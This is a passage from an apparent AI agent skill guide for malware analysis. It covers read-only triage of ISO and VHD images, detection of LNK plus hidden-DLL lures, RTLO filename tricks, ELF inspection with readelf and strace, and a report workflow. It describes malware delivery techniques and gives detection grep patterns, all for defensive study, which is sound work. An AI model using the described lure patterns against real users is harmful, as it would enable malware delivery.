file /tmp/iso_contents/*
find /tmp/iso_contents/ -type f | xargs file
```

**Option B: Mount Read-Only (Linux)**

```bash
# ISO / IMG
sudo mkdir /mnt/suspicious_iso
sudo mount -o loop,ro suspicious.iso /mnt/suspicious_iso

# List all files including hidden
ls -la /mnt/suspicious_iso/
find /mnt/suspicious_iso/ -type f

# Identify file types
find /mnt/suspicious_iso/ -type f -exec file {} \;

# Copy files out for analysis (do not execute in place)
cp -r /mnt/suspicious_iso/ /tmp/iso_extracted/

# Unmount when done
sudo umount /mnt/suspicious_iso
```

**Option C: Mount Read-Only (Windows — analysis VM only)**

```powershell
# Mount as read-only virtual drive
$img = Mount-DiskImage -ImagePath "C:\analysis\suspicious.iso" -Access ReadOnly -PassThru
$driveLetter = ($img | Get-Volume).DriveLetter

# List all files including hidden
Get-ChildItem "${driveLetter}:\" -Recurse -Force | Select FullName, Attributes, Length

# Copy contents for analysis
Copy-Item "${driveLetter}:\*" "C:\analysis\extracted\" -Recurse -Force

# Dismount
Dismount-DiskImage -ImagePath "C:\analysis\suspicious.iso"
```

**VHD/VHDX on Linux:**
```bash
# Install qemu tools if needed
sudo apt install qemu-utils

# Convert VHD to raw for mounting
qemu-img convert -f vpc suspicious.vhd suspicious_raw.img
sudo mount -o loop,ro suspicious_raw.img /mnt/vhd_mount/
```

### What to Look For

**1. LNK + Hidden DLL/EXE (Most Common Pattern)**

The canonical ISO malware delivery pattern:
```
archive.iso/
  Invoice.lnk          <- Victim double-clicks this
  document.pdf          <- Decoy shown to victim
  payload.dll           <- Hidden (file attribute set); executed by LNK via rundll32
```

```bash
# Find hidden files (Linux mount)
find /mnt/suspicious_iso/ -name ".*"
ls -la /mnt/suspicious_iso/

# Analyze LNK files
lnkinfo Invoice.lnk   # Linux
strings Invoice.lnk | grep -E "\.exe|\.dll|rundll32|cmd|powershell"
```

**2. Decoy Documents**

Disk images frequently contain a visible, benign-looking document (PDF, DOCX) displayed to the victim while the payload runs in the background. Flag any document files and analyze them separately using the appropriate section of this skill.

**3. File Naming Tricks**

```bash
# Check for double extensions and right-to-left override (RTLO) tricks
ls -la /mnt/suspicious_iso/
# e.g. a filename containing U+202E (RTLO) makes "exe.doc" display as "cod.exe"

# Detect non-ASCII characters in filenames
find /mnt/suspicious_iso/ -print | cat -v | grep -v "^[[:print:]]*$"
```

**4. Autorun Configuration**

```bash
# Check for autorun.inf (older technique, still seen in IMG files)
cat /mnt/suspicious_iso/autorun.inf 2>/dev/null
```

### Contained File Routing

Once files are extracted, route each to the appropriate analysis path:

| Extracted File Type | Next Step |
|---------------------|-----------|
| `.lnk` | LNK Analysis section (this skill) |
| `.dll` / `.exe` (PE) | malware-triage then malware-dynamic-analysis |
| `.ps1` / `.vbs` / `.js` | Script Analysis section (this skill) |
| `.docm` / `.xlsm` | Office Macro Analysis section (this skill) |
| `.hta` | HTA Analysis section (this skill) |
| Nested `.zip` / `.iso` | Repeat disk image / archive analysis |

### Analysis Checklist - Disk Images

- [ ] File type confirmed (`file` command)
- [ ] Contents listed before extraction
- [ ] Extracted to isolated directory (read-only mount or 7-Zip)
- [ ] All files identified with `file` command (do not trust extensions)
- [ ] Hidden files checked (`-a` flag / `Get-ChildItem -Force`)
- [ ] LNK files analyzed — target, arguments, working directory documented
- [ ] Decoy documents identified
- [ ] RTLO / double-extension filename tricks checked
- [ ] autorun.inf inspected (if present)
- [ ] Payload files routed to appropriate analysis skill
- [ ] MOTW bypass technique documented in report

---

## Linux / ELF Binary Analysis

### Detection
```bash
file sample.bin
# Output: "ELF 64-bit LSB executable, x86-64"
```

### Static Analysis

**ELF Header:**
```bash
readelf -h sample.bin

# Shows:
# - Architecture (x86, x86-64, ARM)
# - Entry point address
# - Program header offset
# - Section header offset
```

**Sections:**
```bash
readelf -S sample.bin

# Look for suspicious sections:
# - High entropy sections (encrypted/packed)
# - Unusual section names
# - RWX sections (read-write-execute)
```

**Imported Libraries:**
```bash
ldd sample.bin

# Look for:
# - libssl.so (crypto/network)
# - libc.so (standard)
# - Unusual paths (/tmp/lib.so)
```

**Imported Symbols:**
```bash
nm -D sample.bin
objdump -T sample.bin

# Search for suspicious functions:
nm -D sample.bin | grep -E "socket|connect|fork|exec|ptrace|system"
```

**Strings:**
```bash
strings -a sample.bin | grep -E "http|/tmp|/etc|passwd"
```

### Dynamic Analysis (Linux — VM only)

The analyst runs these in a disposable REMnux/Linux VM and brings `strace_output.txt` / `ltrace_output.txt` back. You then grep them: `grep -E 'connect\(|socket\(|open(at)?\(|execve\(|ptrace|fork|clone' strace_output.txt`.

**strace - System Call Monitoring:**
```bash
# Monitor all system calls
strace -f ./sample.bin 2>&1 | tee strace_output.txt

# Monitor specific calls
strace -e trace=network,file,process ./sample.bin

# File operations only
strace -e trace=open,read,write,close ./sample.bin

# Network operations only
strace -e trace=socket,connect,send,recv ./sample.bin
```

**ltrace - Library Call Monitoring:**
```bash
ltrace -f ./sample.bin 2>&1 | tee ltrace_output.txt
```

**Check for Packing:**
```bash
# UPX detection
readelf -S sample.bin | grep UPX

# Unpack UPX
upx -d sample.bin -o sample_unpacked.bin
```

### Analysis Checklist - ELF

- [ ] Architecture identified (x86/x64/ARM)
- [ ] Imported libraries documented
- [ ] Suspicious functions identified
- [ ] Packing detected and removed (if UPX)
- [ ] Strings extracted and analyzed
- [ ] System calls monitored (strace)
- [ ] Network activity captured
- [ ] File operations documented

---

## Integration with Report Writing

Each file type contributes specific sections to the malware analysis report:

**.NET Analysis** →
- Decompiled code snippets
- Embedded resource descriptions
- Obfuscation techniques used
- Reflective loading mechanisms

**Office Macros** →
- Macro code (sanitized)
- Auto-execution methods
- Download URLs
- Payload dropping process

**PDF Analysis** →
- Embedded JavaScript
- Auto-action triggers
- Exploit CVEs (if applicable)
- Shellcode presence

**Scripts** →
- Deobfuscated code
- Execution flow
- Download cradles
- C2 communications

**Archives/LNK** →
- Archive structure
- Masquerading techniques
- LNK target analysis
- Social engineering aspects

**HTA Files** →
- Extracted VBScript/JScript
- ActiveX objects abused
- Download cradle URLs
- PowerShell invocation chains

**Disk Images (ISO/VHD)** →
- Container structure and hidden files
- MOTW bypass technique documented
- LNK target and payload relationship
- Decoy document identified

**ELF Binaries** →
- System calls used
- Network protocols
- Persistence mechanisms (cron, systemd)
- Rootkit indicators

---

## Tool Quick Reference

| File Type | Primary Tool | Secondary Tool |
|-----------|--------------|----------------|
| **.NET** | ilspycmd (host) | dnSpy (VM, debugging), de4dot |
| **Office Macros** | oledump.py | olevba, XLMMacroDeobfuscator |
| **PDF** | pdfid.py, pdf-parser.py | peepdf |
| **PowerShell** | python3 base64/gzip decode + grep (host) | PSDecode (VM) |
| **VBScript/JS** | python3 static resolver + grep (host) | js-beautify, Execute→Echo swap (VM) |
| **HTA** | Text editor + grep | CyberChef (decode), Process Monitor (dynamic) |
| **ISO/IMG/VHD/VHDX** | 7-Zip (extract), mount -o ro (Linux) | Mount-DiskImage (Windows), qemu-utils (VHD) |
| **Archives** | 7z, unzip, tar | - |
| **LNK** | LECmd (Win), lnkinfo (Linux) | strings |
| **ELF** | readelf, nm, objdump | strace, ltrace |

---

## Best Practices

**Do:**
- Always identify file type first (`file` command)
- Extract in isolated environments
- Document obfuscation techniques
- Save original and deobfuscated versions
- Test extracted IOCs for accuracy
- Cross-reference with VirusTotal/MalwareBazaar

**Don't:**
- Execute scripts without understanding them first
- Trust file extensions (check magic bytes)
- Skip deobfuscation steps
- Extract archives directly to important directories
- Assume password-protected = safe

---

## Example Usage

**User request:** "Here is invoice.docm, what does it do?"

**What you do:**
1. `file invoice.docm`, hash it, confirm it is an Office document.
2. `olevba --decode invoice.docm > olevba.txt` (and `oledump.py invoice.docm` for the stream map); read `olevba.txt`.
3. Identify the auto-exec entry point (`AutoOpen`/`Document_Open`) and follow it.
4. Resolve the obfuscation in Python on the host (Chr/Replace/base64/concatenation) until the download cradle or dropped payload is readable.
5. `python3 scripts/ioc_extract.py olevba.txt stage*.txt` → defanged URLs, paths, registry keys.
6. If a payload is embedded, carve it, `file` it, hash it, and route it (PE → triage).
7. Write findings + IOCs + ATT&CK (T1566.001, T1204.002, T1059.005, T1105 …) to `analysis_state.md`, recommend the next phase, wait for the user.
